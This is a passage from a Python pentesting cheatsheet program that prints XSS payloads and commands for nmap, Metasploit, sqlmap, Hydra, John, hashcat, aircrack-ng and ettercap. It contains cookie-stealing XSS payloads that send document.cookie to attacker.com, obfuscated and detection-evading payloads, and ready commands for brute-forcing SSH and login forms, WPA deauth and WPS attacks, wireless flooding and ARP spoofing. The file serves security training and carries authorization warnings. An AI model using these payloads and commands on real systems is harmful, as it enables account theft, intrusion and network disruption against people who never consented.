                    "<script>document.location='http://attacker.com?cookie='+document.cookie</script>",
                    (
                        "Redirects victim to attacker's site with stolen cookies\n"
                        "   Use: When fetch() is blocked or unavailable\n"
                        "   How: Redirects browser to attacker's server\n"
                        "   Example: Alternative to fetch() for data exfiltration\n"
                        "   Real scenario: Bypassing Content Security Policy restrictions"
                    ),
                ),
            ],
            "💾 Stored XSS (Persistent)": [
                (
                    "<script>alert('Stored XSS')</script>",
                    (
                        "Persistent XSS that affects all users\n"
                        "   Use: When payload is stored in database\n"
                        "   How: Executes for every user who views the page\n"
                        "   Example: Comments, forum posts, user profiles\n"
                        "   Real scenario: Social media platforms, comment systems"
                    ),
                ),
                (
                    "<script>var img=new Image();img.src='http://attacker.com?cookie='+document.cookie;</script>",
                    (
                        "Stealthy cookie theft using image object\n"
                        "   Use: When you want to avoid redirects\n"
                        "   How: Creates invisible image request with stolen data\n"
                        "   Example: More subtle than redirect-based theft\n"
                        "   Real scenario: Advanced persistent threats, targeted attacks"
                    ),
                ),
                (
                    "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
                    (
                        "Obfuscated XSS using character codes\n"
                        "   Use: Bypassing simple keyword filters\n"
                        "   How: Converts 'alert('XSS')' to character codes\n"
                        "   Example: Bypasses filters looking for 'alert' or 'script'\n"
                        "   Real scenario: WAF evasion, advanced filtering bypass"
                    ),
                ),
            ],
            "🛡️ DOM-Based XSS": [
                (
                    "<script>document.getElementById('demo').innerHTML='<img src=x onerror=alert(1)>'</script>",
                    (
                        "DOM manipulation XSS\n"
                        "   Use: When JavaScript modifies page content\n"
                        "   How: Changes DOM elements to include malicious content\n"
                        "   Example: Single-page applications, dynamic content\n"
                        "   Real scenario: Modern web apps using JavaScript frameworks"
                    ),
                ),
                (
                    "<script>eval(location.hash.substring(1))</script>",
                    (
                        "URL fragment-based XSS\n"
                        "   Use: When page uses URL fragments for functionality\n"
                        "   How: Executes code from URL after # symbol\n"
                        "   Example: #alert('XSS') in URL\n"
                        "   Real scenario: Client-side routing, hash-based navigation"
                    ),
                ),
            ],
            "🚀 Advanced XSS Techniques": [
                (
                    "<script>setTimeout('alert(\\'XSS\\')',1000)</script>",
                    (
                        "Delayed execution XSS\n"
                        "   Use: When you want delayed execution\n"
                        "   How: Executes after 1 second delay\n"
                        "   Example: Bypassing real-time detection systems\n"
                        "   Real scenario: Evading automated security scanners"
                    ),
                ),
                (
                    "<script>setInterval('alert(\\'XSS\\')',2000)</script>",
                    (
                        "Repeated execution XSS\n"
                        "   Use: When you want continuous execution\n"
                        "   How: Executes every 2 seconds\n"
                        "   Example: Persistent monitoring, continuous data theft\n"
                        "   Real scenario: Advanced persistent threats"
                    ),
                ),
                (
                    "<script>document.write('<script>alert(\\'XSS\\')<\\/script>')</script>",
                    (
                        "Nested script injection\n"
                        "   Use: When you need to inject additional script tags\n"
                        "   How: Uses document.write to create new script elements\n"
                        "   Example: Complex XSS scenarios, multi-stage attacks\n"
                        "   Real scenario: Advanced web application attacks"
                    ),
                ),
            ],
        }

        for category, payload_list in payloads_with_descriptions.items():
            print(f"\n\033[95m{category}\033[0m")
            print("-" * len(category.encode("ascii", "ignore")))

            for i, (payload, description) in enumerate(payload_list, 1):
                print(f"\n\033[94m{i}. Payload:\033[0m \033[92m{payload}\033[0m")
                print(f"\033[93m   Description:\033[0m {description}")

        print("\n\033[91m⚠️  IMPORTANT SAFETY NOTES:\033[0m")
        print("• Only test on systems you own or have explicit permission to test")
        print("• XSS can steal user data and compromise accounts")
        print("• Start with simple alert() payloads before attempting data theft")
        print(
            "• Use these payloads in CTF environments and authorized penetration "
            "tests"
        )

        print("\n\033[96m🛡️  PREVENTION FOR DEVELOPERS:\033[0m")
        print("• Output encode all user input (HTML, JavaScript, CSS)")
        print("• Use Content Security Policy (CSP) headers")
        print("• Validate and sanitize all user input")
        print("• Use modern frameworks with built-in XSS protection")

    def _display_cheatsheet(self, tool_name: str, commands: Dict[str, List[tuple]]):
        """Display a formatted cheatsheet for a tool"""
        print(f"\n\033[93m{tool_name.upper()} CHEATSHEET\033[0m")
        print(f"\033[93m{'='*len(tool_name)+'='*10}\033[0m")

        for category, command_list in commands.items():
            print(f"\n\033[95m{category}\033[0m")
            print("-" * len(category.encode("ascii", "ignore")))

            for i, (command, description) in enumerate(command_list, 1):
                print(f"\n\033[94m{i}. Command:\033[0m \033[92m{command}\033[0m")
                print(f"\033[93m   {description}\033[0m")

    def _display_payload_list(self, title: str, payloads: Dict[str, List[str]]):
        """Display a formatted list of payloads"""
        print(f"\n\033[93m{title.upper()}\033[0m")
        print(f"\033[93m{'='*len(title)}\033[0m")

        for category, payload_list in payloads.items():
            print(f"\n\033[95m{category}\033[0m")
            print("-" * len(category.encode("ascii", "ignore")))

            for i, payload in enumerate(payload_list, 1):
                print(f"\n\033[94m{i}. Payload:\033[0m \033[92m{payload}\033[0m")

    def _search_all_cheatsheets(self, keyword: str) -> List[Dict[str, str]]:
        """Search through all cheatsheets for matching commands"""
        results = []

        # Nmap commands
        nmap_commands = {
            "Basic Scans": [
                ("nmap 192.168.1.1", "Basic port scan"),
                ("nmap -sn 192.168.1.0/24", "Ping scan for host discovery"),
                ("nmap -sS 192.168.1.1", "SYN stealth scan"),
                ("nmap -sT 192.168.1.1", "TCP connect scan"),
                ("nmap -p 1-1000 192.168.1.1", "Scan first 1000 ports"),
                ("nmap --top-ports 100 192.168.1.1", "Scan top 100 ports"),
                ("nmap -A 192.168.1.1", "Aggressive scan"),
            ],
            "Port Selection": [
                ("nmap -p 22,80,443 192.168.1.1", "Scan specific ports"),
                ("nmap -p- 192.168.1.1", "Scan all 65535 ports"),
                ("nmap -O 192.168.1.1", "OS detection"),
                ("nmap -f 192.168.1.1", "Fragment packets"),
                ("nmap -T4 192.168.1.1", "Aggressive timing"),
            ],
            "Output": [
                ("nmap -oN scan_results.txt 192.168.1.1", "Save to text file"),
                ("nmap -oX scan_results.xml 192.168.1.1", "Save to XML file"),
                ("nmap -oA complete_scan 192.168.1.1", "Save all formats"),
            ],
        }

        # Metasploit commands
        metasploit_commands = {
            "Basic Commands": [
                ("msfconsole", "Start Metasploit console"),
                ("help", "Show help"),
                ("search <term>", "Search for modules"),
                ("use <module>", "Use a module"),
                ("info", "Show module information"),
                ("back", "Return to main menu"),
            ],
            "Module Management": [
                ("show exploits", "List available exploits"),
                ("show payloads", "List available payloads"),
                ("show auxiliaries", "List auxiliary modules"),
                ("show encoders", "List encoders"),
                ("show nops", "List NOP generators"),
            ],
            "Options & Execution": [
                ("show options", "Show module options"),
                ("set <option> <value>", "Set option value"),
                ("setg <option> <value>", "Set global option"),
                ("unset <option>", "Unset option"),
                ("run", "Execute module"),
                ("exploit", "Execute exploit"),
            ],
            "Payloads": [
                ("set payload <payload>", "Set payload"),
                ("show payloads", "Show compatible payloads"),
                ("generate -f exe -o payload.exe", "Generate standalone payload"),
            ],
            "Sessions": [
                ("sessions -l", "List active sessions"),
                ("sessions -i <id>", "Interact with session"),
                ("sessions -k <id>", "Kill session"),
                ("background", "Background current session"),
            ],
        }

        # SQLMap commands
        sqlmap_commands = {
            "Basic Usage": [
                ("sqlmap -u '<url>'", "Basic SQL injection test"),
                ("sqlmap -u '<url>' --dbs", "Enumerate databases"),
                ("sqlmap -u '<url>' -D <db> --tables", "Enumerate tables"),
                ("sqlmap -u '<url>' -D <db> -T <table> --columns", "Enumerate columns"),
                ("sqlmap -u '<url>' -D <db> -T <table> -C <col> --dump", "Dump data"),
            ],
            "Request Options": [
                ("--cookie='JSESSIONID=...'", "Use cookies"),
                ("--user-agent='...'", "Custom user agent"),
                ("--referer='...'", "Custom referer"),
                ("--headers='X-Forwarded-For: 127.0.0.1'", "Custom headers"),
                ("--method=POST", "Use POST method"),
                ("--data='param=value'", "POST data"),
            ],
            "Detection Options": [
                ("--level=5", "Test level (1-5)"),
                ("--risk=3", "Risk level (1-3)"),
                ("--technique=BEUST", "SQL injection techniques"),
                ("--dbms=mysql", "Force DBMS type"),
                ("--os=linux", "Force OS type"),
            ],
            "Advanced Features": [
                ("--batch", "Non-interactive mode"),
                ("--random-agent", "Use random user agent"),
                ("--proxy=http://127.0.0.1:8080", "Use proxy"),
                ("--tor", "Use Tor network"),
                ("--check-tor", "Check Tor connection"),
                ("--flush-session", "Flush session files"),
            ],
        }

        # Search through all command dictionaries
        all_commands = {
            "Nmap": nmap_commands,
            "Metasploit": metasploit_commands,
            "SQLMap": sqlmap_commands,
        }

        for tool, categories in all_commands.items():
            for category, command_list in categories.items():
                for command, description in command_list:
                    if keyword in command.lower() or keyword in description.lower():
                        results.append(
                            {
                                "tool": tool,
                                "category": category,
                                "command": command,
                                "description": description,
                            }
                        )

        return results

    def _add_custom_command(self):
        """Add a custom command to the collection"""
        name = self.get_user_input("Enter command name: ")
        if not name:
            return

        command = self.get_user_input("Enter the command: ")
        if not command:
            return

        description = self.get_user_input("Enter description: ")
        if not description:
            return

        self.custom_commands[name] = {
            "command": command,
            "description": description,
            "created": datetime.now().isoformat(),
        }

        self.print_success(f"Added custom command: {name}")

    def _view_custom_commands(self):
        """View all custom commands"""
        if not self.custom_commands:
            self.print_info("No custom commands saved")
            return

        print("\nCustom Commands:")
        for name, details in self.custom_commands.items():
            print(f"\n\033[96m{name}:\033[0m")
            print(f"  Command: \033[92m{details['command']}\033[0m")
            print(f"  Description: {details['description']}")
            print(f"  Created: {details['created']}")

    def _edit_custom_command(self):
        """Edit an existing custom command"""
        if not self.custom_commands:
            self.print_info("No custom commands to edit")
            return

        print("\nAvailable commands:")
        for i, name in enumerate(self.custom_commands.keys(), 1):
            print(f"\033[96m{i}.\033[0m {name}")

        try:
            user_input = self.get_user_input("Select command to edit: ")
            if user_input is None:
                return
            choice = int(user_input) - 1
            command_names = list(self.custom_commands.keys())
            if 0 <= choice < len(command_names):
                name = command_names[choice]
                print(f"\nEditing: {name}")
                print(f"Current command: {self.custom_commands[name]['command']}")
                print(
                    f"Current description: {self.custom_commands[name]['description']}"
                )

                new_command = self.get_user_input(
                    "New command (or press Enter to keep current): "
                )
                if new_command:
                    self.custom_commands[name]["command"] = new_command

                new_description = self.get_user_input(
                    "New description (or press Enter to keep current): "
                )
                if new_description:
                    self.custom_commands[name]["description"] = new_description

                self.print_success(f"Updated command: {name}")
            else:
                self.print_error("Invalid selection")
        except ValueError:
            self.print_error("Please enter a valid number")

    def _delete_custom_command(self):
        """Delete a custom command"""
        if not self.custom_commands:
            self.print_info("No custom commands to delete")
            return

        print("\nAvailable commands:")
        for i, name in enumerate(self.custom_commands.keys(), 1):
            print(f"\033[96m{i}.\033[0m {name}")

        try:
            user_input = self.get_user_input("Select command to delete: ")
            if user_input is None:
                return
            choice = int(user_input) - 1
            command_names = list(self.custom_commands.keys())
            if 0 <= choice < len(command_names):
                name = command_names[choice]
                confirm = self.get_user_input(f"Delete '{name}'? (y/N): ")
                if confirm and confirm.lower() == "y":
                    del self.custom_commands[name]
                    self.print_success(f"Deleted command: {name}")
                else:
                    self.print_info("Deletion cancelled")
            else:
                self.print_error("Invalid selection")
        except ValueError:
            self.print_error("Please enter a valid number")

    def _wireshark_cheatsheet(self):
        """Wireshark command cheatsheet"""
        commands = {
            "Display Filters": [
                ("http", "Show HTTP traffic"),
                ("tcp.port == 80", "Show traffic on port 80"),
                ("ip.addr == 192.168.1.1", "Show traffic to/from IP"),
                ("http.request.method == POST", "Show HTTP POST requests"),
                ("ssl", "Show SSL/TLS traffic"),
                ("dns", "Show DNS traffic"),
            ],
            "Capture Filters": [
                ("host 192.168.1.1", "Capture traffic to/from host"),
                ("port 80", "Capture traffic on port 80"),
                ("tcp", "Capture TCP traffic only"),
                ("udp", "Capture UDP traffic only"),
                ("not port 22", "Capture all traffic except SSH"),
            ],
            "Analysis": [
                ("Follow TCP Stream", "Follow conversation between hosts"),
                ("Follow HTTP Stream", "Follow HTTP conversation"),
                ("Export Objects", "Extract files from traffic"),
                ("Statistics > Protocol Hierarchy", "See traffic breakdown"),
                ("Statistics > Conversations", "See host conversations"),
            ],
        }

        self._display_cheatsheet("Wireshark", commands)

    def _nikto_cheatsheet(self):
        """Nikto command cheatsheet"""
        commands = {
            "Basic Usage": [
                ("nikto -h example.com", "Basic web server scan"),
                ("nikto -h example.com -p 443", "Scan HTTPS on port 443"),
                ("nikto -h example.com -ssl", "Force SSL/HTTPS scan"),
                ("nikto -h example.com -port 8080", "Scan on custom port"),
            ],
            "Output Options": [
                ("nikto -h example.com -o results.txt", "Save to text file"),
                ("nikto -h example.com -F txt", "Force text output format"),
                ("nikto -h example.com -Format txt", "Alternative format option"),
                ("nikto -h example.com -v", "Verbose output"),
            ],
        }

        self._display_cheatsheet("Nikto", commands)

    def _dirb_gobuster_cheatsheet(self):
        """Dirb/Gobuster command cheatsheet"""
        commands = {
            "Dirb": [
                ("dirb http://example.com", "Basic directory bruteforce"),
                (
                    "dirb http://example.com /usr/share/dirb/wordlists/common.txt",
                    "Use specific wordlist",
                ),
                ("dirb http://example.com -X .php", "Search for PHP files"),
                ("dirb http://example.com -r", "Recursive scan"),
            ],
            "Gobuster": [
                (
                    "gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt",
                    "Basic directory bruteforce",
                ),
                (
                    "gobuster dir -u http://example.com -w wordlist.txt -x php,html",
                    "Search with extensions",
                ),
                (
                    "gobuster dir -u http://example.com -w wordlist.txt -t 50",
                    "Use 50 threads",
                ),
                (
                    "gobuster vhost -u http://example.com -w subdomains.txt",
                    "Virtual host bruteforce",
                ),
            ],
        }

        self._display_cheatsheet("Dirb/Gobuster", commands)

    def _hydra_cheatsheet(self):
        """Hydra command cheatsheet"""
        commands = {
            "Wordlist Usage": [
                (
                    "hydra -L usernames.txt -P passwords.txt ssh://192.168.1.1",
                    "Different wordlists for username and password",
                ),
                (
                    "hydra -l admin -P passwords.txt ssh://192.168.1.1",
                    "Single username with password wordlist",
                ),
                (
                    "hydra -L usernames.txt -p password123 ssh://192.168.1.1",
                    "Username wordlist with single password",
                ),
                (
                    "hydra -C userpass.txt ssh://192.168.1.1",
                    "Combinator attack (username:password format)",
                ),
            ],
            "SSH Bruteforce": [
                (
                    "hydra -l username -P wordlist.txt ssh://192.168.1.1",
                    "SSH password bruteforce",
                ),
                (
                    "hydra -L users.txt -p password ssh://192.168.1.1",
                    "SSH username bruteforce",
                ),
                (
                    "hydra -l admin -P rockyou.txt ssh://192.168.1.1 -t 4",
                    "SSH with 4 threads",
                ),
                (
                    "hydra -L users.txt -P pass.txt ssh://192.168.1.1 -e nsr",
                    "SSH with null, same as username, reversed username",
                ),
            ],
            "HTTP Forms": [
                (
                    "hydra -l admin -P wordlist.txt 192.168.1.1 http-post-form '/login.php:user=^USER^&pass=^PASS^:Invalid'",
                    "HTTP POST form bruteforce",
                ),
                (
                    "hydra -l admin -P wordlist.txt 192.168.1.1 http-get-form '/login.php:user=^USER^&pass=^PASS^:Invalid'",
                    "HTTP GET form bruteforce",
                ),
                (
                    "hydra -L users.txt -P pass.txt http-post-form '/login:username=^USER^&password=^PASS^:Failed'",
                    "Custom login form with failure message",
                ),
            ],
            "FTP Bruteforce": [
                (
                    "hydra -L users.txt -P passwords.txt ftp://192.168.1.1",
                    "FTP username/password bruteforce",
                ),
                (
                    "hydra -l admin -P wordlist.txt ftp://192.168.1.1 -t 1",
                    "FTP with single thread (stealth)",
                ),
            ],
            "RDP Bruteforce": [
                (
                    "hydra -L users.txt -P passwords.txt rdp://192.168.1.1",
                    "RDP username/password bruteforce",
                ),
            ],
            "SMB Bruteforce": [
                (
                    "hydra -L users.txt -P passwords.txt smb://192.168.1.1",
                    "SMB username/password bruteforce",
                ),
            ],
            "Advanced Options": [
                (
                    "hydra -L users.txt -P pass.txt ssh://192.168.1.1 -t 1 -W 3",
                    "Single thread with 3 second wait (stealth)",
                ),
                (
                    "hydra -L users.txt -P pass.txt ssh://192.168.1.1 -f",
                    "Stop after first valid login found",
                ),
                (
                    "hydra -L users.txt -P pass.txt ssh://192.168.1.1 -V",
                    "Verbose output",
                ),
                (
                    "hydra -L users.txt -P pass.txt ssh://192.168.1.1 -o results.txt",
                    "Save results to file",
                ),
            ],
            "Popular Wordlists": [
                (
                    "/usr/share/wordlists/rockyou.txt",
                    "RockYou password list (14M passwords)",
                ),
                (
                    "/usr/share/wordlists/metasploit/unix_users.txt",
                    "Common Unix usernames",
                ),
                (
                    "/usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt",
                    "Top usernames shortlist",
                ),
                (
                    "/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt",
                    "10 million password list (top 1M)",
                ),
            ],
        }

        self._display_cheatsheet("Hydra", commands)

    def _john_cheatsheet(self):
        """John the Ripper command cheatsheet"""
        commands = {
            "Basic Usage": [
                ("john hash.txt", "Crack password hashes with default settings"),
                ("john --wordlist=wordlist.txt hash.txt", "Use specific wordlist"),
                ("john --show hash.txt", "Show cracked passwords"),
                ("john --format=raw-md5 hash.txt", "Specify hash format"),
                ("john --list=formats", "List all supported hash formats"),
            ],
            "Hash Formats": [
                ("john --format=raw-md5 hash.txt", "MD5 hashes"),
                ("john --format=raw-sha1 hash.txt", "SHA1 hashes"),
                ("john --format=raw-sha256 hash.txt", "SHA256 hashes"),
                ("john --format=nt hash.txt", "Windows NT/LM hashes"),
                ("john --format=sha512crypt hash.txt", "Linux SHA512 crypt"),
                ("john --format=bcrypt hash.txt", "BCrypt hashes"),
                ("john --format=md5crypt hash.txt", "MD5 crypt (Linux)"),
            ],
            "Wordlist Strategies": [
                ("john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt", "Use RockYou wordlist"),
                ("john --wordlist=wordlist.txt --rules hash.txt", "Apply mangling rules"),
                ("john --wordlist=wordlist.txt --incremental hash.txt", "Incremental mode"),
                ("john --wordlist=wordlist.txt --single hash.txt", "Single crack mode"),
                ("john --wordlist=wordlist.txt --external=filter hash.txt", "Custom external filter"),
            ],
            "Advanced Options": [
                ("john --fork=4 hash.txt", "Use 4 CPU cores"),
                ("john --session=my_session hash.txt", "Save/restore session"),
                ("john --restore=my_session", "Restore previous session"),
                ("john --pot=john.pot hash.txt", "Use custom pot file"),
                ("john --show --format=raw-md5 hash.txt", "Show specific format results"),
            ],
            "Rule Files": [
                ("john --wordlist=wordlist.txt --rules=All hash.txt", "Apply all rules"),
                ("john --wordlist=wordlist.txt --rules=Extra hash.txt", "Extra mangling rules"),
                ("john --wordlist=wordlist.txt --rules=Jumbo hash.txt", "Jumbo rule set"),
                ("john --wordlist=wordlist.txt --rules=KoreLogic hash.txt", "KoreLogic rules"),
            ],
            "Performance Tuning": [
                ("john --memory=4096 hash.txt", "Set memory limit to 4GB"),
                ("john --max-run-time=3600 hash.txt", "Limit runtime to 1 hour"),
                ("john --status=hash.txt", "Show cracking progress"),
                ("john --log=john.log hash.txt", "Log output to file"),
            ],
            "Popular Hash Types": [
                ("john --format=raw-md5 hash.txt", "MD5 (32 chars: 5f4dcc3b5aa765d61d8327deb882cf99)"),
                ("john --format=raw-sha1 hash.txt", "SHA1 (40 chars: 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8)"),
                ("john --format=nt hash.txt", "Windows NT (32 chars: 32ed87bdb5fdc5e9cba88547376818d4)"),
                ("john --format=sha512crypt hash.txt", "Linux SHA512 ($6$...)"),
                ("john --format=bcrypt hash.txt", "BCrypt ($2a$... or $2b$...)"),
            ],
        }

        self._display_cheatsheet("John the Ripper", commands)

    def _hashcat_cheatsheet(self):
        """Hashcat command cheatsheet"""
        commands = {
            "Basic Usage": [
                ("hashcat -m 0 hash.txt wordlist.txt", "MD5 cracking"),
                ("hashcat -m 1000 hash.txt wordlist.txt", "NTLM cracking"),
                ("hashcat -m 1800 hash.txt wordlist.txt", "SHA512 cracking"),
                ("hashcat -m 0 hash.txt wordlist.txt -r rules.txt", "Use rule file"),
                ("hashcat --help", "Show all options and hash types"),
            ],
            "Hash Types (-m)": [
                ("hashcat -m 0 hash.txt wordlist.txt", "MD5 (32 chars)"),
                ("hashcat -m 100 hash.txt wordlist.txt", "SHA1 (40 chars)"),
                ("hashcat -m 1400 hash.txt wordlist.txt", "SHA256 (64 chars)"),
                ("hashcat -m 1000 hash.txt wordlist.txt", "NTLM (32 chars)"),
                ("hashcat -m 1800 hash.txt wordlist.txt", "SHA512 (128 chars)"),
                ("hashcat -m 3200 hash.txt wordlist.txt", "BCrypt"),
                ("hashcat -m 500 hash.txt wordlist.txt", "MD5 Crypt (Linux)"),
                ("hashcat -m 7400 hash.txt wordlist.txt", "SHA256 Crypt (Linux)"),
            ],
            "Attack Modes (-a)": [
                ("hashcat -a 0 -m 0 hash.txt wordlist.txt", "Dictionary attack (wordlist)"),
                ("hashcat -a 1 -m 0 hash.txt wordlist1.txt wordlist2.txt", "Combinator attack (word1+word2)"),
                ("hashcat -a 3 -m 0 hash.txt ?a?a?a?a", "Mask attack (4 chars)"),
                ("hashcat -a 6 -m 0 hash.txt wordlist.txt ?a?a", "Hybrid dict+mask (word+2chars)"),
                ("hashcat -a 7 -m 0 hash.txt ?a?a wordlist.txt", "Hybrid mask+dict (2chars+word)"),
            ],
            "Mask Characters": [
                ("hashcat -a 3 -m 0 hash.txt ?l?l?l?l?l?l", "6 lowercase letters"),
                ("hashcat -a 3 -m 0 hash.txt ?u?u?u?u?u?u", "6 uppercase letters"),
                ("hashcat -a 3 -m 0 hash.txt ?d?d?d?d", "4 digits"),
                ("hashcat -a 3 -m 0 hash.txt ?s?s?s?s", "4 special characters"),
                ("hashcat -a 3 -m 0 hash.txt ?a?a?a?a", "4 any characters"),
                ("hashcat -a 3 -m 0 hash.txt ?b?b?b?b", "4 bytes (0x00-0xff)"),
            ],
            "GPU Optimization": [
                ("hashcat -d 0,1,2 -m 0 hash.txt wordlist.txt", "Use GPUs 0,1,2"),
                ("hashcat -w 3 -m 0 hash.txt wordlist.txt", "Workload profile (1-4)"),
                ("hashcat --opencl-device-types 1,2 -m 0 hash.txt wordlist.txt", "Use CPU and GPU"),
                ("hashcat -n 80 -m 0 hash.txt wordlist.txt", "Limit to 80% GPU usage"),
            ],
            "Rule Files": [
                ("hashcat -r /usr/share/hashcat/rules/best64.rule -m 0 hash.txt wordlist.txt", "Best64 rules"),
                ("hashcat -r /usr/share/hashcat/rules/d3ad0ne.rule -m 0 hash.txt wordlist.txt", "D3ad0ne rules"),
                ("hashcat -r /usr/share/hashcat/rules/rockyou-30000.rule -m 0 hash.txt wordlist.txt", "RockYou rules"),
                ("hashcat -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule -m 0 hash.txt wordlist.txt", "OneRuleToRuleThemAll"),
            ],
            "Performance & Output": [
                ("hashcat -o cracked.txt -m 0 hash.txt wordlist.txt", "Save cracked passwords"),
                ("hashcat --potfile-disable -m 0 hash.txt wordlist.txt", "Disable potfile"),
                ("hashcat --session=my_session -m 0 hash.txt wordlist.txt", "Save/restore session"),
                ("hashcat --restore my_session", "Restore previous session"),
                ("hashcat --status -m 0 hash.txt wordlist.txt", "Show progress"),
            ],
            "Advanced Options": [
                ("hashcat --increment -m 0 hash.txt ?a?a?a?a", "Incremental mask (1-4 chars)"),
                ("hashcat --increment-min=3 --increment-max=6 -m 0 hash.txt ?a?a?a?a?a?a", "Incremental 3-6 chars"),
                ("hashcat --loopback -m 0 hash.txt wordlist.txt", "Use cracked passwords as wordlist"),
                ("hashcat --left -m 0 hash.txt wordlist.txt", "Show uncracked hashes"),
                ("hashcat --show -m 0 hash.txt", "Show cracked hashes"),
            ],
            "Popular Wordlists": [
                ("hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt", "RockYou wordlist"),
                ("hashcat -m 0 hash.txt /usr/share/wordlists/metasploit/unix_passwords.txt", "Unix passwords"),
                ("hashcat -m 0 hash.txt /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt", "10M password list"),
            ],
        }

        self._display_cheatsheet("Hashcat", commands)

    def _aircrack_cheatsheet(self):
        """Aircrack-ng command cheatsheet"""
        commands = {
            "Interface Management": [
                ("airmon-ng start wlan0", "Start monitor mode on wlan0"),
                ("airmon-ng stop wlan0mon", "Stop monitor mode"),
                ("airmon-ng check kill", "Kill processes that interfere with monitor mode"),
                ("iwconfig", "List wireless interfaces"),
                ("ifconfig wlan0mon up", "Bring monitor interface up"),
            ],
            "Network Discovery": [
                ("airodump-ng wlan0mon", "Scan for all networks"),
                ("airodump-ng -c 6 wlan0mon", "Scan on specific channel"),
                ("airodump-ng --bssid 00:11:22:33:44:55 wlan0mon", "Focus on specific network"),
                ("airodump-ng --essid 'NetworkName' wlan0mon", "Focus on network by name"),
                ("airodump-ng --manufacturer wlan0mon", "Show manufacturer information"),
            ],
            "Packet Capture": [
                ("airodump-ng -c 6 -w capture wlan0mon", "Capture on channel 6"),
                ("airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon", "Capture specific network"),
                ("airodump-ng -c 6 --bssid 00:11:22:33:44:55 --channel 6 -w capture wlan0mon", "Capture with channel lock"),
                ("airodump-ng --ivs -w capture wlan0mon", "Capture only IVs (WEP)"),
                ("airodump-ng --wps wlan0mon", "Scan for WPS-enabled networks"),
            ],
            "WEP Attacks": [
                ("aireplay-ng --deauth 1 -a 00:11:22:33:44:55 wlan0mon", "Deauthentication attack"),
                ("aireplay-ng --fakeauth 0 -a 00:11:22:33:44:55 -h 00:11:22:33:44:66 wlan0mon", "Fake authentication"),
                ("aireplay-ng --arp -r replay_arp-0123-456789.cap wlan0mon", "ARP replay attack"),
                ("aircrack-ng capture-01.cap", "Crack WEP with captured packets"),
                ("aircrack-ng -b 00:11:22:33:44:55 capture-01.cap", "Crack specific network"),
            ],
            "WPA/WPA2 Attacks": [
                ("aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c FF:FF:FF:FF:FF:FF wlan0mon", "Deauth to capture handshake"),
                ("aircrack-ng -w wordlist.txt capture-01.cap", "Dictionary attack on WPA"),
                ("aircrack-ng -w wordlist.txt -e 'NetworkName' capture-01.cap", "Crack specific network"),
                ("aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture-01.cap", "Crack by BSSID"),
            ],
            "WPS Attacks": [
                ("reaver -i wlan0mon -b 00:11:22:33:44:55", "Reaver WPS attack"),
                ("reaver -i wlan0mon -b 00:11:22:33:44:55 -vv", "Verbose Reaver attack"),
                ("reaver -i wlan0mon -b 00:11:22:33:44:55 -K 1", "KoreK attack method"),
                ("bully wlan0mon -b 00:11:22:33:44:55", "Bully WPS attack"),
            ],
            "Advanced Attacks": [
                ("mdk4 wlan0mon d -b blacklist.txt", "Deauthentication flood"),
                ("mdk4 wlan0mon b -f networks.txt", "Beacon flood"),
                ("mdk4 wlan0mon a -a 00:11:22:33:44:55", "Authentication flood"),
                ("mdk4 wlan0mon p -t 00:11:22:33:44:55", "Probe request flood"),
            ],
            "Analysis Tools": [
                ("airdecap-ng -w password capture-01.cap", "Decrypt WEP/WPA traffic"),
                ("airdecloak-ng -i capture-01.cap -o decloaked.cap", "Remove WEP cloaking"),
                ("packetforge-ng --arp -a 00:11:22:33:44:55 -h 00:11:22:33:44:66 -k 192.168.1.1 -l 192.168.1.100 -y fragment-0123-456789.xor -w arp-request", "Forge ARP packet"),
            ],
            "Wordlists for WPA": [
                ("aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap", "RockYou wordlist"),
                ("aircrack-ng -w /usr/share/wordlists/metasploit/unix_passwords.txt capture-01.cap", "Unix passwords"),
                ("aircrack-ng -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt capture-01.cap", "10M password list"),
            ],
        }

        self._display_cheatsheet("Aircrack-ng", commands)

    def _ettercap_cheatsheet(self):
        """Ettercap command cheatsheet"""
        commands = {
            "Interface Selection": [
                ("ettercap -G", "Start graphical interface"),
                ("ettercap -T -q -i eth0", "Text interface, quiet mode"),
                ("ettercap -C -i eth0", "Curses interface"),
                ("ettercap -D -i eth0", "Daemon mode"),
            ],
            "Target Selection": [
                ("ettercap -T -q -i eth0 -M arp:remote /192.168.1.1/ /192.168.1.2/", "ARP spoofing between hosts"),
                ("ettercap -T -q -i eth0 -M arp:remote /192.168.1.1/ //", "ARP spoofing to gateway"),
                ("ettercap -T -q -i eth0 -M arp:remote // /192.168.1.2/", "ARP spoofing from gateway"),
                ("ettercap -T -q -i eth0 -M arp:remote /192.168.1.0/24/", "ARP spoofing entire subnet"),
            ],
            "Attack Methods": [
                ("ettercap -T -q -i eth0 -M arp:remote /192.168.1.1/ /192.168.1.2/", "ARP spoofing"),
                ("ettercap -T -q -i eth0 -M icmp:remote /192.168.1.1/ /192.168.1.2/", "ICMP redirect"),
                ("ettercap -T -q -i eth0 -M dhcp:remote /192.168.1.1/ /192.168.1.2/", "DHCP spoofing"),
                ("ettercap -T -q -i eth0 -M port:remote /192.168.1.1/ /192.168.1.2/", "Port stealing"),
            ],
            "Sniffing Options": [
                ("ettercap -T -q -i eth0 -s", "Sniff only (no attack)"),
                ("ettercap -T -q -i eth0 -u", "Update arp cache"),
                ("ettercap -T -q -i eth0 -p", "Don't poison"),
                ("ettercap -T -q -i eth0 -n", "Don't resolve names"),
            ],
            "Filtering": [
                ("ettercap -T -q -i eth0 -F filter.ef", "Load filter file"),
                ("ettercap -T -q -i eth0 -f filter.ef", "Load filter file (alternative)"),
                ("ettercap -T -q -i eth0 -L logfile", "Log to file"),
                ("ettercap -T -q -i eth0 -l logdir", "Log to directory"),
            ],
            "Advanced Options": [
                ("ettercap -T -q -i eth0 -w capture.pcap", "Save to pcap file"),
